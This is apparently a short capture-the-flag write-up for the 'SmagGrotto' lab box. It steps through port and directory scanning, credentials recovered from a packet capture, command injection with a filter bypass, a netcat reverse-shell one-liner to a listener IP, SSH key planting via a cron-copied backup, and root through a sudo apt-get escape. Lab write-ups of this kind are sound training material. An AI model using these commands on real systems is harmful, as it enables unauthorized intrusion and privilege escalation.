# CTF Writeup: SmagGrotto

---

- Step 1: added target_ip to /etc/hosts & made nmap scan --> 22,80 open
- Step 2: ran gobuster scan for hidden dir's --> /mail open
- Step 3: navigated there and checked source-code for it. downloaded the network package file
which was downloadable there
- Step 4: analyzed the http stream with wireshark --> wireshark networkpackagefile and retrieved
package information with creds and hidden sub-domain "development.smag.thm
- Step 5: added sub-domain to /etc/hosts
- Step 6: 3 files displayed --> admin.php & clicked on it --> file prompted login page --> logged in
- Step 7: after "Enter a command" prompt page came --> tried some commands, but didn't work,
played around with filter bypasses --> command injection possible
- Step 8: started listener & 
made "r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.156.104 1234 >/tmp/f"
- Step 9: gained rce into the server 
- Step 10: checked out /etc/crontab --> active instance in which there is a public 
key backup file from user jake --> cronjob updates the backup into the real authorized_keys in intervalls
- Step 11: added my public key into jake_id_rsa.pub.backup
- Step 12: on my local machine --> made ssh -i id_rsa9 jake@target_ip and gained ssh with jake
- Step 13: made sudo -l --> binary "/usr/bin/apt-get" is runnable without password on root
checked out on gtfobins for exploits regarding apt-get --> found "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
- Step 14: executed command and gained root --> retrieved root flag.

---

## Key Learnings

- Further strengthened assymetric encryption knowledge
- Slightly strenghtened methodology
